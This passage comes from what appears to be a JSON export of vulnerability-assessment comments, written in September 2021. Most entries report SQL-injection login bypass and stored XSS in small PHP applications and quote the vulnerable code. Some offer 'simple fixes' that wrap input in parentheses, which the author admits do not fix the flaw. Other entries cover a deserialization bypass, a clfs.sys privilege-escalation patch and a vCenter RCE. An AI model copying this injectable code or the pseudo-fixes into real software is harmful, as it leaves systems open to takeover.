      "id": "cf061e97-8d2b-404b-bc64-b446cf687db0",
      "editorId": "198da8db-21b5-4678-a70d-51ae5c950847",
      "topicId": "22292f97-fb9f-4690-9693-8a7e14535f0c",
      "created": "2021-09-15T11:44:20.223914Z",
      "revisionDate": "2021-09-15T11:44:20.220247Z",
      "document": "## [CVE-nu11-11](https://www.sourcecodester.com/php/14902/simple-assembly-hall-scheduling-system-php-free-source-code.html)\r\n![](https://github.com/nu11secur1ty/CVE-nu11secur1ty/blob/main/vendors/oretnom23/CVE-nu11-11/cookie_login.PNG)\r\n\r\n\r\n## Description:\r\nThe AHSS-PHP (by: oretnom23 ) v1.0 is vulnerable in the application /scheduler/classes/Login.php to remote SQL-Injection-Bypass-Authentication + XSS-Stored Hijacking PHPSESSID\r\n- m0re info: https://portswigger.net/support/using-sql-injection-to-bypass-authentication. \r\nThe parameter (username) from the login form is not protected correctly and there is no security and escaping from malicious payloads. \r\nWhen the user will sending a malicious query or malicious payload to the MySQL server he can bypass the login credentials and take control of the administer account.\r\n2. XSS - Stored PHPSESSID Vulnerable\r\n- The vulnerable XSS app: is \"manage_assembly\", parameters: \"room_name\" \"location\" and \"description\"\r\nAfter the successful SQL injection, the malicious user can be storing an XSS payload whit who can take the \r\nactive PHPSESSID session.\r\n3. remote PHPSESSID - Injection\r\n- After the successful XSS attack the malicious user can take control of the administrative account of the system from everywhere \r\nby using the PHPSESSID, and then he can make a lot of bad things!\r\n\r\n-------------------------------------------------------------------\r\n### CONCLUSION: \r\nThis vendor must STOP creating all these broken projects and vulnerable software programs, probably he is not a developer!\r\n\r\n### BR \r\n- [+] @nu11secur1ty System Administrator - Infrastructure and Penetration Testing Engineer\r\n\r\n-------------------------------------------------------------------\r\n### Reproduce: \r\n[href](https://github.com/nu11secur1ty/CVE-nu11secur1ty/tree/main/vendors/oretnom23/CVE-nu11-11)\r\n\r\n### Proof: \r\n[href](https://streamable.com/b8g00y)\r\n\r\n### BR nu11secur1ty",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Execution",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "aafb76ee-47a5-4ad8-9bf6-a141e71f9c6a",
      "editorId": "1754d880-537c-48c4-8738-5ad2ccde5258",
      "topicId": "2a275b81-06d9-407e-9568-7163dcb89779",
      "created": "2021-09-15T14:48:44.418509Z",
      "revisionDate": "2021-09-27T16:01:33.376306Z",
      "document": "The `com.adventnet.me.itom.framework.ITOMObjectInputStream` is a class that was added to fix the serialization issue originally disclosed in [CVE-2020-28653](https://attackerkb.com/topics/uFkcCFlzIW/cve-2020-28653). It's located in the `OpManagerServerClasses.jar` file. It works by overriding the `resolveClass` method and using a boolean state variable `classResolved`. When the object is initialized, the caller must call `setClassName` to add the names of one or more classes that are allowed to be deserialized. The `classResolved` state variable is initialized to false, and when a class is resolved if it's name is in the list of allowed classes, it's set to true and resolving carries on as usual. If no allowed classes are defined, or the class name that is being deserialized is not in the allowed list, an exception is thrown.\r\n\r\nA flaw exists in this implementation whereby if a single `ITOMObjectInputStream` instance is used for multiple `readObject` calls, then only the first will be protected because the `classResolved` state variable will persist into subsequent calls. This means a vulnerable use of this class would initialize it and then use the same instance for 2 or more `readObject` calls. The first object must be of the expected type, but any after that can be used for malicious deserialization purposes.\r\n\r\nSuch a vulnerable invocations is present in the `com.adventnet.tools.sum.server.session.SUMServerIOAndDataAnalyzer` class's `process` method. This class is located in the `AdventNetSUMServer.jar` file. It can be accessed by sending a serialized SUMPDU object with an `OPEN_SESSION` request (see `SUMHttpRequestHandler.processSumPDU`). This will cause `SUMServerIOAndDataAnalyzer` to be initialized as the socket client. Once initialized, the data field of serialized SUMPDU object will be passed to the `SUMServerIOAndDataAnalyzer.process` method where the vulnerable serialization operations can occur.",
      "score": 4,
      "metadata": {
        "attacker-value": 4,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        }
      ]
    },
    {
      "id": "5abb97dd-a083-4ffb-9e3e-c24ada4735e7",
      "editorId": "198da8db-21b5-4678-a70d-51ae5c950847",
      "topicId": "4fed6a8c-2dcc-4751-8108-657304e22955",
      "created": "2021-09-16T10:48:28.970053Z",
      "revisionDate": "2021-09-16T10:51:24.347757Z",
      "document": "## [CVE-nu11-12-09162021](https://www.sourcecodester.com/php/10584/south-gate-inn-online-reservation-system.html)\r\n![](https://github.com/nu11secur1ty/CVE-nu11secur1ty/blob/main/vendors/janobe/CVE-nu11-12-09162021/docs/southgateinnps.asd_.sad__1.png)\r\n\r\n### Description:\r\nThe South Gate Inn Online Reservation System \u00a9 South Gate Inn is vulnerable to remote SQL-Injection-Bypass-Authentication for the admin account and XSS-Stored PWNED.\r\nremote SQL-Injection-Bypass-Authentication: https://portswigger.net/support/using-sql-injection-to-bypass-authentication. \r\nThe parameters (email and Password) from the login form are not protected correctly and there is no security and escaping from malicious payloads. \r\nWhen the user will sending a malicious query or malicious payload to the MySQL server for login to the admin account on the system, \r\nhe can bypass the login credentials and take control of this account. \r\nAnd the second time he can access the admin account and adding a payload by using the XSS-Stored technique which can break the MySQL server.\r\n\r\n### Reproduce:\r\n[href](https://github.com/nu11secur1ty/CVE-nu11secur1ty/tree/main/vendors/janobe/CVE-nu11-12-09162021)\r\n\r\n## Proof:\r\n[href](https://streamable.com/a2ym1t)",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Execution",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "f0a90887-598a-4919-80aa-6ddcf4793d13",
      "editorId": "198da8db-21b5-4678-a70d-51ae5c950847",
      "topicId": "b7e47bcc-b318-40b0-a84a-be6df981f1ff",
      "created": "2021-09-17T08:39:52.287284Z",
      "revisionDate": "2021-09-17T08:46:22.006406Z",
      "document": "## [CVE-nu11-13-091721](https://www.sourcecodester.com/php/11072/simple-membership-system.html)\r\n![](https://github.com/nu11secur1ty/CVE-nu11secur1ty/blob/main/vendors/razormist/docs/screen.png)\r\n\r\n## Vulnerability `PHP`app code `validate.php`and structure also \r\n```php\r\n<?php\r\n\trequire_once 'conn.php';\r\n\t$username = $_POST['username'];\r\n\t$password = $_POST['password'];\r\n\t$query = $conn->query(\"SELECT * FROM `admin` WHERE `username` = '$username' && `password` = '$password'\") or die(mysqli_error());\r\n\t$validate = $query->num_rows;\r\n\t$fetch = $query->fetch_array();\r\n\tif($validate > 0){\r\n\t\techo \"Success\";\r\n\t\tsession_start();\r\n\t\t$_SESSION['admin_id'] = $fetch['admin_id'];\r\n\t}else{\r\n\t\techo \"Error\";\r\n\t}\r\n```\r\n## Simple fix.\r\n-  WARNING: THIS IS `NOT FIX` OF THE PROBLEM, Just an example =)\r\n\r\n```php\r\n<?php\r\n\trequire_once 'conn.php';\r\n\t$username = $_POST['username'];\r\n\t$password = $_POST['password'];\r\n\t$query = $conn->query(\"SELECT * FROM `admin` WHERE `username` = ('$username') && `password` = '$password'\") or die(mysqli_error());\r\n\t$validate = $query->num_rows;\r\n\t$fetch = $query->fetch_array();\r\n\tif($validate > 0){\r\n\t\techo \"Success\";\r\n\t\tsession_start();\r\n\t\t$_SESSION['admin_id'] = $fetch['admin_id'];\r\n\t}else{\r\n\t\techo \"Error\";\r\n\t}\r\n```\r\n### Description:\r\nThe Simple Membership System using PHP and AJAX is vulnerable to remote SQL-Injection-Bypass-Authentication for the admin account/XSS-Stored PWNED.\r\nremote SQL-Injection-Bypass-Authentication: https://portswigger.net/support/using-sql-injection-to-bypass-authentication. \r\nThe parameters (username and password) from the login form is not protected correctly and there is no security and escaping from malicious payloads. \r\nWhen the user will sending a malicious query or malicious payload to the MySQL server for login to the admin account on the system, \r\nhe can bypass the login credentials and take control of this account. And the second time he can adding an payload by using XSS-Stored \r\n\r\n### BR \r\n- [+] @nu11secur1ty System Administrator - Infrastructure and Penetration Testing Engineer\r\n\r\n-------------------------------------------------------------------\r\n### Reproduce: \r\n[href](https://github.com/nu11secur1ty/CVE-nu11secur1ty/tree/main/vendors/razormist)\r\n\r\n### Proof: \r\n[href](https://streamable.com/21cj5f)\r\n\r\n### BR nu11secur1ty",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Execution",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "a20c9974-65f2-4dd7-a517-e5c1eefac5d8",
      "editorId": "b50031c2-b390-4cf9-bf6f-7a5fb8cf8677",
      "topicId": "86b09c61-4cee-48ad-9c51-8e9476dae9f1",
      "created": "2021-09-18T00:23:36.08653Z",
      "revisionDate": "2021-09-27T14:59:23.233259Z",
      "document": "Hmm so this is quite an interesting one. This is similar to CVE-2021-36963 and CVE-2021-38633, both of which are marked as low complexity for being exploited and which will likely get you SYSTEM access, however if you look at the advisory for this bug at https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36955 it is the only one where the \"Exploit Code Maturity\" is marked as \"Functional\" in other words Microsoft has verified that code exists to exploit this vulnerability and it works under most scenarios.\r\n\r\nAgain this is still only local privilege escalation so this isn't triggerable remotely, hence why the severity is high due to M.S saying this is easy to form an exploit for and the fact that functional exploit code exists according to M.S, however it isn't Very High since you still need access to an account on the target to exploit this.\r\n\r\nGiven that this gives SYSTEM level code access and its not hard to make an exploit for it according to Microsoft I would patch this sooner rather than later along with CVE-2021-36963 and CVE-2021-38633. I am still investigating this deeper to figure out what was patched but here is the list of functions within clfs.sys that I believe were patched as part of fixing this bug:\r\n\r\n```\r\n00012\t1c00299b4\tprivate: long CClfsBaseFilePersisted::CreateContainer(struct _UNICODE_STRING const &,unsigned __int64 const &,unsigned long,unsigned char,unsigned char,class CClfsContainer * &)\t1c0028824\tprivate: long CClfsBaseFilePersisted::CreateContainer(struct _UNICODE_STRING const &,unsigned __int64 const &,unsigned long,unsigned char,unsigned char,class CClfsContainer * &)\t0.990\t62\t61\tPerfect match, same name\r\n00013\t1c0029d74\tpublic: long CClfsContainer::Create(struct _UNICODE_STRING &,unsigned __int64 const &,struct _CLFS_FILTER_CONTEXT const &,void * const,unsigned char,unsigned char &)\t1c0028bdc\tpublic: long CClfsContainer::Create(struct _UNICODE_STRING &,unsigned __int64 const &,struct _CLFS_FILTER_CONTEXT const &,void * const,unsigned char,unsigned char &)\t0.950\t50\t49\tPerfect match, same name\r\n00024\t1c0031a68\tpublic: long CClfsBaseFile::GetSymbol(long,unsigned char,struct _CLFS_CLIENT_CONTEXT * *)\t1c00308c8\tpublic: long CClfsBaseFile::GetSymbol(long,unsigned char,struct _CLFS_CLIENT_CONTEXT * *)\t0.950\t14\t17\tPerfect match, same name\r\n00026\t1c0032550\tClfsCreateLogFile\t1c00313d0\tClfsCreateLogFile\t0.910\t169\t164\tPerfect match, same name\r\n00025\t1c0032420\tpublic: long CClfsBaseFile::GetSymbol(long,unsigned long,struct _CLFS_CONTAINER_CONTEXT * *)\t1c0031290\tpublic: long CClfsBaseFile::GetSymbol(long,unsigned long,struct _CLFS_CONTAINER_CONTEXT * *)\t0.870\t17\t20\tPerfect match, same name\r\n00047\t1c004f3d8\tprivate: long CClfsBaseFilePersisted::ExtendMetadataBlockDescriptor(unsigned long,unsigned long)\t1c004e238\tprivate: long CClfsBaseFilePersisted::ExtendMetadataBlockDescriptor(unsigned long,unsigned long)\t0.740\t41\t46\tPerfect match, same name\r\n```\r\n\r\nMore details to come when I get the analysis finished some more.\r\n\r\nSo far that the function `Feature_Servicing_2103c_ClfsStatusPrivilegeNotHeld_31093721__private_IsEnabled()` was removed from the new build of `clfs.sys`, and also from the `CClfsBaseFilePersisted::CreateContainer` call where it was called from. Now it directly checks the return code from `CClfsContainer::Create(_UNICODE_STRING &,unsigned __int64 const &,_CLFS_FILTER_CONTEXT const &,void * const,uchar,uchar &)` to see if it returned the status code `STATUS_PRIVILEGE_NOT_HELD` whereas before it would check the return code of `Feature_Servicing_2103c_ClfsStatusPrivilegeNotHeld_31093721__private_IsEnabled()` for this status.",
      "score": 2,
      "metadata": {
        "mitre-tactics": "Privilege Escalation",
        "attacker-value": 4
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "c77a6902-4cd9-42c0-85af-3a0b6b803b51",
      "editorId": "198da8db-21b5-4678-a70d-51ae5c950847",
      "topicId": "ab07b369-b434-46fe-a21c-76ebb790f7a4",
      "created": "2021-09-20T14:08:38.600561Z",
      "revisionDate": "2021-09-20T14:11:12.190127Z",
      "document": "## [CVE-2021-36624](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-36624)\r\n![](https://github.com/nu11secur1ty/CVE-mitre/blob/main/CVE-2021-36624/docs/home_osms.jpg)\r\n\r\n## Vulnerable PHP code and logic: `ExLogin.php`\r\n```php\r\n<?php\r\n// Start the session\r\nsession_start();\r\n\r\n\r\ninclude '../config/config.php';\r\ninclude '../config/config1.php';\r\ninclude '../config/connect.php';\r\n\r\n $UName = ($_POST[\"Username\"]);\r\n $PW = ($_POST[\"Password\"]);\r\n $PassWord=0;\r\n $UserName=0;\r\n$quer= mysqli_query($conn,\"SELECT * FROM user where username='$UName' AND passwourd='$PW'\");\r\nwhile($ss = mysqli_fetch_array($quer))\r\n\t{\r\n\t$UserName=$ss['username'];\r\n\t$PassWord=$ss['passwourd'];\r\n\t$userid=$ss['userid'];\r\n\t$name=$ss['name'];\r\n\t$profilepicture=$ss['profilepicture'];\r\n\t$IDBranch=$ss['IDBranch'];\r\n\t$role=$ss['role'];\r\n\t}\r\n\r\nif($PassWord!=$PW || $UserName!=$UName ){\r\necho \"<script>alert('Incorrect UserName or Password')</script>\";\r\necho \"<script>location.href='../index.php'</script>\";\r\n}\r\nelse\r\n{\r\n$_SESSION[\"Id\"]=$userid;\r\n$_SESSION[\"name\"]=$name;\r\n$_SESSION[\"profilepicture\"]=$profilepicture;\r\n$_SESSION[\"IDBranch\"]=$IDBranch;\r\n$_SESSION[\"role\"]=$role;\r\n\r\n?>\r\n\r\n<!--<script>\r\nvar person = prompt(\"Please enter your name\", \"Harry Potter\");\r\nif (person != null) {\r\n    document.getElementById(\"demo\").innerHTML =\r\n    \"Hello \" + person + \"! How are you today?\";\r\n}\r\n</script>-->\r\n<script>location.href='../dashboard.php'</script>\"; -->\t\r\n\r\n<?php } ?>\r\n```\r\n\r\n\r\n### Description:\r\nSourcecodester Phone Shop Sales Managements System version 1.0 suffers from a remote SQL injection vulnerability that allows for authentication bypass.\r\n\r\n-------------------------------------------------------------------\r\n### Reproduce: \r\n[href](https://github.com/nu11secur1ty/CVE-mitre/tree/main/CVE-2021-36624)\r\n\r\n### Proof: \r\n[href](https://streamable.com/8xmsxq)\r\n\r\n### BR nu11secur1ty",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Execution",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "75b630f3-3f91-4868-9de5-82e9a42a224e",
      "editorId": "198da8db-21b5-4678-a70d-51ae5c950847",
      "topicId": "49211f06-c338-4787-819e-57a6dda880bf",
      "created": "2021-09-21T06:06:47.661776Z",
      "revisionDate": "2021-09-21T06:07:59.380236Z",
      "document": "## [CVE-nu11-14-092121](https://www.sourcecodester.com/php/14525/simple-forumdiscussion-system-using-phpmysql-source-code.html)\r\n![](https://github.com/nu11secur1ty/CVE-nu11secur1ty/blob/main/vendors/oretnom23/CVE-nu11-14-092121/docs/forum.png)\r\n\r\n### Description:\r\nThe Simple Forum/Discussion System by (oretnom23) is vulnerable to remote SQL-Injection-Bypass-Authentication for the admin account in app `admin_class.php`. \r\nremote SQL-Injection-Bypass-Authentication: https://portswigger.net/support/using-sql-injection-to-bypass-authentication. \r\nThe parameter (username) from the login form is not protected correctly and there is no security and escaping from malicious payloads. \r\nWhen the user will sending a malicious query or malicious payload to the MySQL server, he can bypass the login credentials and take control of the admin account.\r\n\r\n### Vulnerable PHP part of code and all logic and architecture of the login form:\r\n\r\n```php\r\n\r\nfunction login(){\r\n\t\t\r\n\t\t\textract($_POST);\t\t\r\n\t\t\t$qry = $this->db->query(\"SELECT * FROM users where username = '\".$username.\"' and password = '\".md5($password).\"' \");\r\n\t\t\tif($qry->num_rows > 0){\r\n\t\t\t\tforeach ($qry->fetch_array() as $key => $value) {\r\n\t\t\t\t\tif($key != 'passwors' && !is_numeric($key))\r\n\t\t\t\t\t\t$_SESSION['login_'.$key] = $value;\r\n\t\t\t\t}\r\n\t\t\t\t\treturn 1;\r\n\t\t\t}else{\r\n\t\t\t\treturn 3;\r\n\t\t\t}\r\n\t}\r\n\r\n```\r\n### Simple fix but not correct and strong =)\r\n\r\n```PHP\r\n\r\n\tfunction login(){\r\n\t\t\r\n\t\t\textract($_POST);\t\t\r\n\t\t\t$qry = $this->db->query(\"SELECT * FROM users where username = ('\".$username.\"') and password = '\".md5($password).\"' \");\r\n\t\t\tif($qry->num_rows > 0){\r\n\t\t\t\tforeach ($qry->fetch_array() as $key => $value) {\r\n\t\t\t\t\tif($key != 'passwors' && !is_numeric($key))\r\n\t\t\t\t\t\t$_SESSION['login_'.$key] = $value;\r\n\t\t\t\t}\r\n\t\t\t\t\treturn 1;\r\n\t\t\t}else{\r\n\t\t\t\treturn 3;\r\n\t\t\t}\r\n\t}\r\n\r\n  ```\r\n### REproduce:\r\n[href](https://github.com/nu11secur1ty/CVE-nu11secur1ty/tree/main/vendors/oretnom23/CVE-nu11-14-092121)\r\n\r\n### Proof:\r\n[href](https://streamable.com/sv9nfj)",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Execution",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "b25e8bea-fbfd-45ab-b05d-6ac8620cdc19",
      "editorId": "198da8db-21b5-4678-a70d-51ae5c950847",
      "topicId": "05ebdecb-493c-43e8-a773-e65e4493fc11",
      "created": "2021-09-21T08:32:16.041967Z",
      "revisionDate": "2021-09-21T08:32:16.040439Z",
      "document": "## [CVE-nu11-15-092121](https://www.sourcecodester.com/php/14953/student-quarterly-grading-system-using-php-and-sqlite-free-source-code.html)\r\n![](https://github.com/nu11secur1ty/CVE-nu11secur1ty/blob/main/vendors/oretnom23/CVE-nu11-15-092121/docs/report_4.png)\r\n\r\n### Description:\r\nThe Student Quarterly Grading System (by: oretnom23 ) is vulnerable to XSS - Stored PHPSESSID Hijacking Vulnerable PWNED.\r\nThe vulnerable app: is \"users\", with parameters: \"fullname\" and \"username\".\r\nAfter the successful PWNED of the credentials for the admin account.\r\nThe malicious user can be storing an XSS payload, whit who can take the active PHPSESSID\r\nevery time when he wants to log in to the system with an admin account by using this exploit.\r\n\r\n### Reproduce:\r\n[href](https://github.com/nu11secur1ty/CVE-nu11secur1ty/tree/main/vendors/oretnom23/CVE-nu11-15-092121)\r\n\r\n### Proof:\r\n[href](https://streamable.com/kk96j4)",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Execution",
        "attacker-value": 3,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "1a4228a8-bc05-41a0-a7ee-43d4fa7e381e",
          "name": "Difficult to patch",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "difficult_to_patch"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "425a3176-25e2-4d4f-9784-b16fb12ba930",
      "editorId": "198da8db-21b5-4678-a70d-51ae5c950847",
      "topicId": "91720611-9f38-4ebc-b15b-e77e7b240304",
      "created": "2021-09-21T11:43:22.813289Z",
      "revisionDate": "2021-09-27T14:59:15.461908Z",
      "document": "## [CVE-nu11-16-092121](https://www.sourcecodester.com/php/14831/billing-system-project-php-source-code-free-download.html)\r\n\r\n## The vendor is so beautiful, but this is not enough ;) \r\n\r\n----------------------------------------------------------------------------------------------------------------------------\r\n\r\n![](https://github.com/nu11secur1ty/CVE-nu11secur1ty/blob/main/vendors/mayuri_k/docs/billing-system-project-in-php-source-code-free-download.jpg)\r\n\r\n### Description:\r\nThe \u00a9 2021 Rupee Invoice System - Mayuri K | Designed by: Mayurik K is vulnerable to remote SQL-Injection-Bypass-Authentication. \r\nremote SQL-Injection-Bypass-Authentication: https://portswigger.net/support/using-sql-injection-to-bypass-authentication. \r\nThe parameter (username) from the login form is not protected correctly and there is no security and escaping from malicious payloads. \r\nWhen the user will sending a malicious query or malicious payload to the MySQL server for those three accounts, he can bypass the login credentials and take control of the admin account.\r\n\r\n## Broken structure on `login.php` app:\r\n```PHP\r\n$errors = array();\r\n\r\nif($_POST) {    \r\n\r\n  $username = $_POST['username'];\r\n  $password = $_POST['password'];\r\n\r\n  if(empty($username) || empty($password)) {\r\n    if($username == \"\") {\r\n      $errors[] = \"Username is required\";\r\n    } \r\n\r\n    if($password == \"\") {\r\n      $errors[] = \"Password is required\";\r\n    }\r\n  } else {\r\n    $sql = \"SELECT * FROM users WHERE username = ('$username')\";\r\n    $result = $connect->query($sql);\r\n\r\n    if($result->num_rows == 1) {\r\n      $password = md5($password);\r\n      // exists\r\n      $mainSql = \"SELECT * FROM users WHERE username = '$username' AND password = '$password'\";\r\n      $mainResult = $connect->query($mainSql);\r\n\r\n      if($mainResult->num_rows == 1) {\r\n        $value = $mainResult->fetch_assoc();\r\n        $user_id = $value['user_id'];\r\n\r\n        // set session\r\n        $_SESSION['userId'] = $user_id;?>\r\n```\r\n## Simple fixed, but not enough ;)\r\n[href](https://github.com/nu11secur1ty/CVE-nu11secur1ty/blob/main/vendors/mayuri_k/docs/fixhaha.gif)\r\n\r\n## Decision:\r\n[href](https://www.nu11secur1ty.com/2021/08/php-sec-login.html)\r\n\r\n## BR",
      "score": 2,
      "metadata": {
        "mitre-tactics": "Execution",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "5421771c-c5b7-4b04-aa8a-e9efa552d9c7",
      "editorId": "def09af1-8f99-4d16-aaa9-1db131246a3a",
      "topicId": "a2c0fb81-b0c3-4850-9393-e52427779fbf",
      "created": "2021-09-21T18:53:07.136456Z",
      "revisionDate": "2021-09-27T14:58:39.108433Z",
      "document": " A RCE vulnerability exists in  vCenter Server 6.7 and 7.0 which could allow an actor to with access to port 443 can execute commands and software on unpatched vCenter Server deployments by uploading a specially crafted file.\r\nhttps://www.bleepingcomputer.com/news/security/vmware-warns-of-critical-bug-in-default-vcenter-server-installs/#.YUoiQlUeVM8",
      "score": 2,
      "metadata": {},
      "tags": []
    },
    {
      "id": "1dfb25c7-b550-418e-bb36-e686771f680c",
      "editorId": "a84e860b-902e-4786-8670-9ef6df8e8815",
      "topicId": "a2c0fb81-b0c3-4850-9393-e52427779fbf",
      "created": "2021-09-22T13:31:46.883859Z",
      "revisionDate": "2021-09-27T14:44:55.179718Z",
      "document": "This is a **remote -code-execution vulnerability** which can be abused by an **unauthenticated** attacker. According to the [VMware FAQ](https://core.vmware.com/vmsa-2021-0020-questions-answers-faq#sec18451-sub2) this vulnerability can be used under the following circumstances:\r\n\r\n>  This vulnerability can be used by anyone who can reach vCenter Server over the network to gain access, regardless of the configuration settings of vCenter Server.\r\n\r\nLooking at the timeline of another file upload vuln in vmware vcenter:\r\n\r\n**CVE-2021-21972**  \r\n- published on 2021-02-23 https://www.vmware.com/security/advisories/VMSA-2021-0002.html \r\n- public exploitation on 2021-02-26 https://twitter.com/bad_packets/status/1408890423871819781\r\n\r\nI would argue, that this vuln has a high likelyhood of being exploited soon.\r\n",
      "score": 2,
      "metadata": {
        "mitre-tactics": "Lateral Movement",
        "attacker-value": 4,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "3ed270cd-37f8-465a-a06c-e431f2571443",
      "editorId": "198da8db-21b5-4678-a70d-51ae5c950847",
      "topicId": "f7ccd0b7-220b-49e5-a4df-27e26b64a3f0",
      "created": "2021-09-22T16:28:56.520564Z",
